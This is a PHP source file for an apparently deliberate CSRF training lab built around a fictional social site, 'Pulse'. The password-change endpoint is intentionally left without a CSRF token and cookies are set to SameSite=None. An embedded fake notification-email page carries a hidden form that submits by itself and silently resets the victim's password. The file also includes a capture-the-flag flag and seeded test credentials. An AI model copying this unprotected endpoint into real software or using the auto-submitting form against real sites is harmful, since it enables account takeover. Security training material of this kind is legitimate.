<?php
// Lab 1307 — CSRF Basics: Password Change Without Token
// Platform: "Pulse" — fictional social media site
// Vulnerability: POST /index.php?action=settings has NO CSRF token.
//   Any cross-origin HTML form can silently change the victim's password.
// Difficulty: Easy (Training) | Pure black-box — no hints in UI

// SameSite=None allows cross-origin requests to include the session cookie,
// which is required for CSRF attacks to work in modern browsers.
// Secure=true is mandatory when SameSite=None (requires HTTPS).
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,
    'httponly'  => true,
    'samesite' => 'None',
]);
session_start();

// ── Database Configuration ──────────────────────────────────────────────────────
// Replace the placeholders below with your cPanel MySQL credentials:
//   1. Create a database + user in cPanel (MySQL Database Wizard)
//   2. Copy the full database name, username, and password cPanel gives you
//   3. Paste them below and upload this file to your cPanel hosting
// ──────────────────────────────────────────────────────────────────────────────
$db_host     = (getenv('DB_HOST') ?: (file_exists('/.dockerenv') ? 'krazeplanet' : '127.0.0.1'));                          // Usually 'localhost' on cPanel
$db_username = 'root';               // REPLACE: your cPanel DB username
$db_password = '';          // REPLACE: your cPanel DB password
$db_name     = 'KrazePlanet';                // REPLACE: your cPanel database name

$db = new mysqli($db_host, $db_username, $db_password, $db_name);
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host   = $scheme . '://' . $_SERVER['HTTP_HOST'];

$loginUrl    = $host . '/index.php';
$registerUrl = $host . '/index.php?action=register';
$profileUrl  = $host . '/index.php?action=profile';
$settingsUrl = $host . '/index.php?action=settings';
$logoutUrl   = $host . '/index.php?logout=1';
$attackUrl   = $host . '/index.php?attack=1';

define('LAB_FLAG', 'flag{csrf_basics_no_token_password_change_1307}');

// ── Tables ────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1307_users (
    id           INT AUTO_INCREMENT PRIMARY KEY,
    username     VARCHAR(100) NOT NULL UNIQUE,
    email        VARCHAR(255) NOT NULL UNIQUE,
    password     VARCHAR(255) NOT NULL,
    bio          VARCHAR(255) DEFAULT '',
    avatar_color VARCHAR(7)   DEFAULT '#6366F1',
    csrf_pwnd    TINYINT(1)   DEFAULT 0,
    created_at   TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
)");

// ── Seed accounts ─────────────────────────────────────────────────────────────
$check = $db->query("SELECT id FROM lab1307_users WHERE email='jessica@pulse.social'");
if ($check && $check->num_rows === 0) {
    $h1 = password_hash('jess@123', PASSWORD_BCRYPT);
    $h2 = password_hash('ryan@123', PASSWORD_BCRYPT);
    $h3 = password_hash('priya@123', PASSWORD_BCRYPT);
    $db->query("INSERT INTO lab1307_users (username, email, password, bio, avatar_color) VALUES
        ('jessica_lee',   'jessica@pulse.social', '$h1', 'Designer ✨ | Cats 🐱 | Matcha 🍵', '#EC4899'),
        ('ryan_carter',   'ryan@pulse.social',    '$h2', 'Gamer 🎮 | Music � | Pizza 🍕',   '#F59E0B'),
        ('priya_sharma',  'priya@pulse.social',   '$h3', 'Coder � | Hiking 🥾 | Sushi 🍣',  '#8B5CF6')");
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Route detection ───────────────────────────────────────────────────────────
$action     = $_GET['action'] ?? '';
$isLogout   = isset($_GET['logout']);
$isAttack   = isset($_GET['attack']);
$isRegister = ($action === 'register');
$isProfile  = ($action === 'profile');
$isSettings = ($action === 'settings');
$error      = '';

// ── Logout ────────────────────────────────────────────────────────────────────
if ($isLogout) {
    session_destroy();
    header('Location: ' . $loginUrl);
    exit;
}

// ── Load session user ─────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1307_uid'])) {
    $st = $db->prepare("SELECT * FROM lab1307_users WHERE id = ?");
    $st->bind_param('i', $_SESSION['lab1307_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── POST: Register ────────────────────────────────────────────────────────────
if ($isRegister && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $uname = trim($_POST['username'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['password'] ?? '';
    if ($uname && $email && $pass) {
        $hashed = password_hash($pass, PASSWORD_BCRYPT);
        $st = $db->prepare("INSERT INTO lab1307_users (username, email, password) VALUES (?,?,?)");
        $st->bind_param('sss', $uname, $email, $hashed);
        if ($st->execute()) {
            $_SESSION['lab1307_uid'] = $db->insert_id;
            header('Location: ' . $profileUrl);
            exit;
        }
        $error = 'Username or email already taken.';
        $st->close();
    } else {
        $error = 'All fields are required.';
    }
}

// ── POST: Login ───────────────────────────────────────────────────────────────
if (!$isRegister && !$isSettings && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $pass  = $_POST['password'] ?? '';
    if ($email && $pass) {
        $st = $db->prepare("SELECT * FROM lab1307_users WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $user = $st->get_result()->fetch_assoc();
        $st->close();
        if ($user && password_verify($pass, $user['password'])) {
            $_SESSION['lab1307_uid'] = $user['id'];
            header('Location: ' . $profileUrl);
            exit;
        }
        $error = 'Invalid email or password.';
    } else {
        $error = 'Email and password are required.';
    }
}

// ── POST: Settings — VULNERABLE (no CSRF token check) ────────────────────────
if ($isSettings && $_SERVER['REQUEST_METHOD'] === 'POST' && $currentUser) {
    $newPass = $_POST['new_password']     ?? '';
    $confirm = $_POST['confirm_password'] ?? '';
    // ⚠ No CSRF token check — that is the vulnerability.
    if ($newPass && $confirm) {
        if ($newPass === $confirm) {
            $hashed = password_hash($newPass, PASSWORD_BCRYPT);
            $uid    = (int)$currentUser['id'];
            $st = $db->prepare("UPDATE lab1307_users SET password=?, csrf_pwnd=1 WHERE id=?");
            $st->bind_param('si', $hashed, $uid);
            if ($st->execute()) {
                $st->close();
                header('Location: ' . $settingsUrl . '&updated=1');
                exit;
            }
            $error = 'Failed to update password. Please try again.';
            $st->close();
        }
        $error = 'Passwords do not match.';
    } else {
        $error = 'Both password fields are required.';
    }
}

// ── Redirect logged-in user away from login/register ─────────────────────────
if ($currentUser && !$isProfile && !$isSettings && !$isAttack && !$action) {
    header('Location: ' . $profileUrl);
    exit;
}

// ── Guard: protected pages require login ──────────────────────────────────────
if (!$currentUser && !$isAttack && !$isRegister && $action) {
    header('Location: ' . $loginUrl);
    exit;
}

// ── Reload user after possible POST update ────────────────────────────────────
if ($isSettings && $currentUser) {
    $st = $db->prepare("SELECT * FROM lab1307_users WHERE id = ?");
    $st->bind_param('i', $currentUser['id']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Pulse<?php
    if ($isAttack)   echo ' — Notification';
    elseif ($isSettings) echo ' — Settings';
    elseif ($isProfile)  echo ' — Home';
    elseif ($isRegister) echo ' — Sign Up';
    else                 echo ' — Sign In';
?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#F9FAFB;color:#111827;min-height:100vh;}

/* ── NAV ───────────────────────────────────────────────────────────────────── */
.pls-nav{background:#fff;border-bottom:1px solid #E5E7EB;height:56px;display:flex;align-items:center;padding:0 24px;gap:8px;position:sticky;top:0;z-index:100;}
.pls-logo{font-size:1.2rem;font-weight:800;color:#6366F1;display:flex;align-items:center;gap:8px;text-decoration:none;margin-right:12px;}
.pls-logo-icon{width:28px;height:28px;background:#6366F1;border-radius:8px;display:flex;align-items:center;justify-content:center;}
.pls-logo-icon svg{width:16px;height:16px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;}
.pls-nav-link{color:#6B7280;text-decoration:none;font-size:.875rem;font-weight:500;padding:6px 12px;border-radius:6px;transition:background .15s,color .15s;}
.pls-nav-link:hover{background:#F3F4F6;color:#111827;}
.pls-nav-link.active{background:#EEF2FF;color:#6366F1;}
.pls-nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.pls-nav-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:#fff;flex-shrink:0;}
.pls-nav-username{font-size:.875rem;font-weight:500;color:#374151;}
.pls-nav-logout{font-size:.8rem;color:#9CA3AF;text-decoration:none;padding:4px 10px;border-radius:6px;border:1px solid #E5E7EB;}
.pls-nav-logout:hover{color:#EF4444;border-color:#FECACA;background:#FEF2F2;}

/* ── PROFILE ───────────────────────────────────────────────────────────────── */
.pls-wrap{max-width:680px;margin:32px auto;padding:0 16px;}
.pls-profile-card{background:#fff;border-radius:16px;border:1px solid #E5E7EB;overflow:hidden;margin-bottom:20px;}
.pls-profile-banner{height:96px;background:linear-gradient(135deg,#6366F1 0%,#8B5CF6 100%);}
.pls-profile-body{padding:0 24px 24px;}
.pls-avatar-lg{width:72px;height:72px;border-radius:50%;border:4px solid #fff;margin-top:-36px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;font-weight:700;color:#fff;}
.pls-profile-name{font-size:1.05rem;font-weight:700;color:#111827;margin-top:10px;}
.pls-profile-handle{font-size:.82rem;color:#6B7280;margin-top:3px;}
.pls-profile-bio{font-size:.875rem;color:#374151;margin-top:10px;line-height:1.5;}
.pls-profile-stats{display:flex;gap:24px;margin-top:16px;padding-top:16px;border-top:1px solid #F3F4F6;}
.pls-stat{text-align:center;}
.pls-stat-val{font-size:1rem;font-weight:700;color:#111827;}
.pls-stat-lbl{font-size:.72rem;color:#9CA3AF;margin-top:2px;}
.pls-feed{display:flex;flex-direction:column;gap:12px;}
.pls-post{background:#fff;border-radius:12px;border:1px solid #E5E7EB;padding:16px;}
.pls-post-meta{display:flex;align-items:center;gap:10px;margin-bottom:10px;}
.pls-post-avatar{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.75rem;font-weight:700;color:#fff;flex-shrink:0;}
.pls-post-name{font-size:.875rem;font-weight:600;color:#111827;}
.pls-post-time{font-size:.75rem;color:#9CA3AF;}
.pls-post-body{font-size:.875rem;color:#374151;line-height:1.55;}
.pls-post-actions{display:flex;gap:20px;margin-top:12px;padding-top:12px;border-top:1px solid #F9FAFB;}
.pls-post-btn{font-size:.8rem;color:#9CA3AF;display:flex;align-items:center;gap:5px;cursor:pointer;user-select:none;}
.pls-post-btn svg{width:14px;height:14px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;}

/* ── SETTINGS ──────────────────────────────────────────────────────────────── */
.pls-settings-title{font-size:1.2rem;font-weight:700;color:#111827;margin-bottom:20px;}
.pls-card{background:#fff;border-radius:12px;border:1px solid #E5E7EB;overflow:hidden;margin-bottom:16px;}
.pls-card-hdr{padding:13px 20px;border-bottom:1px solid #F3F4F6;font-size:.82rem;font-weight:600;color:#374151;background:#FAFAFA;text-transform:uppercase;letter-spacing:.04em;}
.pls-card-body{padding:20px;}
.pls-field{margin-bottom:16px;}
.pls-field:last-child{margin-bottom:0;}
.pls-field label{display:block;font-size:.78rem;font-weight:600;color:#374151;margin-bottom:6px;text-transform:uppercase;letter-spacing:.04em;}
.pls-field input{width:100%;padding:9px 12px;border:1px solid #D1D5DB;border-radius:8px;font-size:.875rem;color:#111827;outline:none;transition:border-color .15s,box-shadow .15s;}
.pls-field input:focus{border-color:#6366F1;box-shadow:0 0 0 3px rgba(99,102,241,.12);}
.pls-field input:disabled{background:#F9FAFB;color:#9CA3AF;cursor:not-allowed;}
.pls-btn{background:#6366F1;color:#fff;border:none;padding:9px 22px;border-radius:8px;font-size:.875rem;font-weight:600;cursor:pointer;transition:background .15s;}
.pls-btn:hover{background:#4F46E5;}
.pls-error{background:#FEF2F2;border:1px solid #FECACA;color:#DC2626;padding:10px 14px;border-radius:8px;font-size:.8rem;margin-bottom:14px;}
.pls-flag-banner{background:#FEF2F2;border:1px solid #FECACA;border-radius:10px;padding:18px 20px;margin-bottom:20px;}
.pls-flag-banner-title{font-size:.78rem;font-weight:700;color:#DC2626;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;}
.pls-flag-banner-label{font-size:.78rem;color:#6B7280;margin-bottom:6px;}
.pls-flag-val{font-family:'Courier New',Courier,monospace;font-size:.9rem;font-weight:700;color:#111827;background:#F9FAFB;border:1px solid #E5E7EB;padding:10px 14px;border-radius:6px;word-break:break-all;}

/* ── AUTH ──────────────────────────────────────────────────────────────────── */
.pls-auth-bg{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#F9FAFB;padding:24px;}
.pls-auth-card{background:#fff;border-radius:16px;border:1px solid #E5E7EB;width:100%;max-width:380px;padding:32px;}
.pls-auth-logo-wrap{text-align:center;margin-bottom:24px;}
.pls-auth-logo-icon{width:52px;height:52px;background:#6366F1;border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;}
.pls-auth-logo-icon svg{width:28px;height:28px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;}
.pls-auth-title{font-size:1.15rem;font-weight:700;color:#111827;text-align:center;margin-bottom:4px;}
.pls-auth-sub{font-size:.82rem;color:#9CA3AF;text-align:center;margin-bottom:24px;}
.pls-auth-submit{width:100%;background:#6366F1;color:#fff;border:none;padding:10px;border-radius:8px;font-size:.9rem;font-weight:600;cursor:pointer;transition:background .15s;margin-top:4px;}
.pls-auth-submit:hover{background:#4F46E5;}
.pls-auth-footer{text-align:center;margin-top:20px;font-size:.82rem;color:#9CA3AF;}
.pls-auth-footer a{color:#6366F1;font-weight:500;text-decoration:none;}

/* ── ATTACK PAGE ───────────────────────────────────────────────────────────── */
.pls-atk-bg{min-height:100vh;background:#F3F4F6;display:flex;align-items:center;justify-content:center;padding:24px;}
.pls-atk-email{background:#fff;border-radius:14px;border:1px solid #E5E7EB;width:100%;max-width:460px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.06);}
.pls-atk-hdr{background:#6366F1;padding:18px 24px;display:flex;align-items:center;gap:12px;}
.pls-atk-hdr svg{width:26px;height:26px;fill:none;stroke:#fff;stroke-width:2.5;stroke-linecap:round;}
.pls-atk-brand{font-size:1.1rem;font-weight:800;color:#fff;letter-spacing:-.01em;}
.pls-atk-body{padding:28px 24px;}
.pls-atk-greeting{font-size:1rem;font-weight:700;color:#111827;margin-bottom:8px;}
.pls-atk-text{font-size:.875rem;color:#6B7280;line-height:1.6;margin-bottom:20px;}
.pls-atk-notif{background:#EEF2FF;border-radius:10px;padding:14px 16px;display:flex;align-items:center;gap:14px;margin-bottom:22px;}
.pls-atk-notif-icon{width:42px;height:42px;background:#6366F1;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.pls-atk-notif-icon svg{width:20px;height:20px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;}
.pls-atk-notif-text{font-size:.85rem;color:#374151;line-height:1.45;}
.pls-atk-notif-name{font-weight:600;color:#111827;}
.pls-atk-btn{background:#6366F1;color:#fff;border:none;width:100%;padding:12px;border-radius:8px;font-size:.9rem;font-weight:600;cursor:pointer;transition:background .15s;}
.pls-atk-btn:hover{background:#4F46E5;}
.pls-atk-btn:disabled{opacity:.6;cursor:not-allowed;}
.pls-atk-footer{padding:14px 24px;border-top:1px solid #F3F4F6;font-size:.68rem;color:#9CA3AF;text-align:center;line-height:1.6;}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Fake "Pulse" notification email
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="pls-atk-bg">

  <!-- ⚠ CSRF form: POSTs to /index.php?action=settings — no CSRF token.
       Victim's password is silently changed to h@ck3d123. -->
  <form id="csrfForm"
        action="/index.php?action=settings"
        method="POST"
        style="display:none;">
    <input type="hidden" name="new_password"     value="h@ck3d123">
    <input type="hidden" name="confirm_password" value="h@ck3d123">
  </form>

  <div class="pls-atk-email">
    <div class="pls-atk-hdr">
      <svg viewBox="0 0 24 24"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
      <span class="pls-atk-brand">Pulse</span>
    </div>
    <div class="pls-atk-body">
      <div class="pls-atk-greeting">Hey <?= esc($currentUser ? $currentUser['username'] : 'there') ?> 👋</div>
      <div class="pls-atk-text">
        You have new activity on your Pulse account.
        Someone reacted to one of your recent posts — click below to see who!
      </div>
      <div class="pls-atk-notif">
        <div class="pls-atk-notif-icon">
          <svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg>
        </div>
        <div class="pls-atk-notif-text">
          <span class="pls-atk-notif-name">jamie_photography</span> and
          <span class="pls-atk-notif-name">3 others</span> liked your photo
          <em>"Golden hour at the coast 🌅"</em>
        </div>
      </div>
      <button class="pls-atk-btn" id="viewBtn" onclick="fireCSRF()">
        View Notification →
      </button>
    </div>
    <div class="pls-atk-footer">
      You're receiving this email because you're a Pulse member.<br>
      pulse.social · <a href="#" style="color:#9CA3AF;">Unsubscribe</a> · <a href="#" style="color:#9CA3AF;">Privacy Policy</a>
    </div>
  </div>
</div>
<script>
function fireCSRF() {
    var btn = document.getElementById('viewBtn');
    btn.disabled = true;
    btn.textContent = 'Loading…';
    document.getElementById('csrfForm').submit();
}
// Auto-submit after 1.5s for realism — real CSRF pages don't wait for clicks
setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
</script>

<?php elseif ($isSettings && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     SETTINGS PAGE — Password change form (VULNERABLE: no CSRF token)
     ══════════════════════════════════════════════════════════════════════════ -->
<nav class="pls-nav">
  <a href="/index.php?action=profile" class="pls-logo">
    <div class="pls-logo-icon"><svg viewBox="0 0 24 24"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg></div>
    Pulse
  </a>
  <a href="/index.php?action=profile"  class="pls-nav-link">Home</a>
  <a href="/index.php?action=profile"  class="pls-nav-link">Profile</a>
  <a href="/index.php?action=settings" class="pls-nav-link active">Settings</a>
  <div class="pls-nav-right">
    <div class="pls-nav-avatar" style="background:<?= esc($currentUser['avatar_color']) ?>">
      <?= strtoupper(substr($currentUser['username'], 0, 2)) ?>
    </div>
    <span class="pls-nav-username"><?= esc($currentUser['username']) ?></span>
    <a href="/index.php?logout=1" class="pls-nav-logout">Sign out</a>
  </div>
</nav>

<div class="pls-wrap">
  <div class="pls-settings-title">Account Settings</div>

  <?php if (isset($_GET['updated'])): ?>
  <div id="successMsg" style="background:#F0FDF4;border:1px solid #BBF7D0;color:#166534;padding:12px 16px;border-radius:8px;font-size:.875rem;margin-bottom:16px;display:flex;align-items:center;gap:8px;transition:opacity .4s ease;">
    <svg style="width:18px;height:18px;flex-shrink:0;" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
    Your password has been updated successfully.
  </div>
  <script>setTimeout(function(){var m=document.getElementById('successMsg');m.style.opacity='0';setTimeout(function(){m.remove()},400)},3000);</script>
  <?php endif; ?>

  <?php if ($error): ?><div class="pls-error"><?= esc($error) ?></div><?php endif; ?>

  <div class="pls-card">
    <div class="pls-card-hdr">Profile Information</div>
    <div class="pls-card-body">
      <div class="pls-field">
        <label>Username</label>
        <input type="text" value="<?= esc($currentUser['username']) ?>" disabled>
      </div>
      <div class="pls-field">
        <label>Email</label>
        <input type="email" value="<?= esc($currentUser['email']) ?>" disabled>
      </div>
    </div>
  </div>

  <div class="pls-card">
    <div class="pls-card-hdr">Change Password</div>
    <div class="pls-card-body">
      <!-- ⚠ VULNERABLE: no csrf_token hidden field -->
      <form method="POST" action="/index.php?action=settings">
        <div class="pls-field">
          <label>New Password</label>
          <input type="password" name="new_password" placeholder="Enter new password" autocomplete="new-password">
        </div>
        <div class="pls-field">
          <label>Confirm New Password</label>
          <input type="password" name="confirm_password" placeholder="Repeat new password" autocomplete="new-password">
        </div>
        <button type="submit" class="pls-btn">Update Password</button>
      </form>
    </div>
  </div>
</div>

<?php elseif ($isProfile && $currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     PROFILE / HOME PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<nav class="pls-nav">
  <a href="/index.php?action=profile" class="pls-logo">
    <div class="pls-logo-icon"><svg viewBox="0 0 24 24"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg></div>
    Pulse
  </a>
  <a href="/index.php?action=profile"  class="pls-nav-link active">Home</a>
  <a href="/index.php?action=profile"  class="pls-nav-link">Profile</a>
  <a href="/index.php?action=settings" class="pls-nav-link">Settings</a>
  <div class="pls-nav-right">
    <div class="pls-nav-avatar" style="background:<?= esc($currentUser['avatar_color']) ?>">
      <?= strtoupper(substr($currentUser['username'], 0, 2)) ?>
    </div>
    <span class="pls-nav-username"><?= esc($currentUser['username']) ?></span>
    <a href="/index.php?logout=1" class="pls-nav-logout">Sign out</a>
  </div>
</nav>

<div class="pls-wrap">
  <div class="pls-profile-card">
    <div class="pls-profile-banner"></div>
    <div class="pls-profile-body">
      <div class="pls-avatar-lg" style="background:<?= esc($currentUser['avatar_color']) ?>">
        <?= strtoupper(substr($currentUser['username'], 0, 2)) ?>
      </div>
      <div class="pls-profile-name"><?= esc($currentUser['username']) ?></div>
      <div class="pls-profile-handle">@<?= esc($currentUser['username']) ?> · <?= esc($currentUser['email']) ?></div>
      <?php if ($currentUser['bio']): ?>
      <div class="pls-profile-bio"><?= esc($currentUser['bio']) ?></div>
      <?php endif; ?>
      <div class="pls-profile-stats">
        <div class="pls-stat"><div class="pls-stat-val">47</div><div class="pls-stat-lbl">Posts</div></div>
        <div class="pls-stat"><div class="pls-stat-val">1.2k</div><div class="pls-stat-lbl">Followers</div></div>
        <div class="pls-stat"><div class="pls-stat-val">892</div><div class="pls-stat-lbl">Following</div></div>
      </div>
    </div>
  </div>

  <div class="pls-feed">
    <div class="pls-post">
      <div class="pls-post-meta">
        <div class="pls-post-avatar" style="background:<?= esc($currentUser['avatar_color']) ?>"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
        <div><div class="pls-post-name"><?= esc($currentUser['username']) ?></div><div class="pls-post-time">2 hours ago</div></div>
      </div>
      <div class="pls-post-body">Golden hour at the coast 🌅 — sometimes you just have to stop and appreciate how beautiful this world is. No filter needed.</div>
      <div class="pls-post-actions">
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg> 142 Likes</span>
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg> 28 Comments</span>
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg> Share</span>
      </div>
    </div>

    <div class="pls-post">
      <div class="pls-post-meta">
        <div class="pls-post-avatar" style="background:<?= esc($currentUser['avatar_color']) ?>"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
        <div><div class="pls-post-name"><?= esc($currentUser['username']) ?></div><div class="pls-post-time">Yesterday</div></div>
      </div>
      <div class="pls-post-body">Just tried the new coffee place downtown ☕ — third wave, single origin, honestly life-changing. If you're a coffee nerd, this is your spot.</div>
      <div class="pls-post-actions">
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg> 87 Likes</span>
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg> 14 Comments</span>
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg> Share</span>
      </div>
    </div>

    <div class="pls-post">
      <div class="pls-post-meta">
        <div class="pls-post-avatar" style="background:<?= esc($currentUser['avatar_color']) ?>"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
        <div><div class="pls-post-name"><?= esc($currentUser['username']) ?></div><div class="pls-post-time">3 days ago</div></div>
      </div>
      <div class="pls-post-body">Landed in Lisbon 🇵🇹 for a week. The tiles, the hills, the pastéis de nata — already considering never leaving.</div>
      <div class="pls-post-actions">
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg> 214 Likes</span>
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg> 51 Comments</span>
        <span class="pls-post-btn"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg> Share</span>
      </div>
    </div>
  </div>
</div>

<?php elseif ($isRegister): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     REGISTER PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="pls-auth-bg">
  <div class="pls-auth-card">
    <div class="pls-auth-logo-wrap">
      <div class="pls-auth-logo-icon"><svg viewBox="0 0 24 24"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg></div>
    </div>
    <div class="pls-auth-title">Create your account</div>
    <div class="pls-auth-sub">Join Pulse and share your world</div>

    <?php if ($error): ?><div class="pls-error"><?= esc($error) ?></div><?php endif; ?>

    <form method="POST" action="/index.php?action=register">
      <div class="pls-field">
        <label>Username</label>
        <input type="text" name="username" placeholder="your_username" required autocomplete="username">
      </div>
      <div class="pls-field">
        <label>Email</label>
        <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
      </div>
      <div class="pls-field" style="margin-bottom:20px;">
        <label>Password</label>
        <input type="password" name="password" placeholder="Create a password" required autocomplete="new-password">
      </div>
      <button type="submit" class="pls-auth-submit">Create Account</button>
    </form>

    <div class="pls-auth-footer">
      Already have an account? <a href="/index.php">Sign in</a>
    </div>
  </div>
</div>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="pls-auth-bg">
  <div class="pls-auth-card">
    <div class="pls-auth-logo-wrap">
      <div class="pls-auth-logo-icon"><svg viewBox="0 0 24 24"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg></div>
    </div>
    <div class="pls-auth-title">Sign in to Pulse</div>
    <div class="pls-auth-sub">Welcome back</div>

    <?php if ($error): ?><div class="pls-error"><?= esc($error) ?></div><?php endif; ?>

    <form method="POST" action="/index.php">
      <div class="pls-field">
        <label>Email</label>
        <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
      </div>
      <div class="pls-field" style="margin-bottom:20px;">
        <label>Password</label>
        <input type="password" name="password" placeholder="Your password" required autocomplete="current-password">
      </div>
      <button type="submit" class="pls-auth-submit">Sign In</button>
    </form>

    <div style="background:#F3F4F6;border:1px solid #E5E7EB;border-radius:8px;padding:10px 12px;margin-top:14px;font-size:11px;">
      <div style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#9CA3AF;margin-bottom:8px;">📋 Test Accounts</div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #E5E7EB;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">jessica@pulse.social</span><span style="font-family:monospace;font-weight:700;color:#111827;font-size:11px;white-space:nowrap;">jess@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#E0E7FF;color:#4F46E5;white-space:nowrap;">User</span></div>
      <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #E5E7EB;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">ryan@pulse.social</span><span style="font-family:monospace;font-weight:700;color:#111827;font-size:11px;white-space:nowrap;">ryan@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#E0E7FF;color:#4F46E5;white-space:nowrap;">User</span></div>
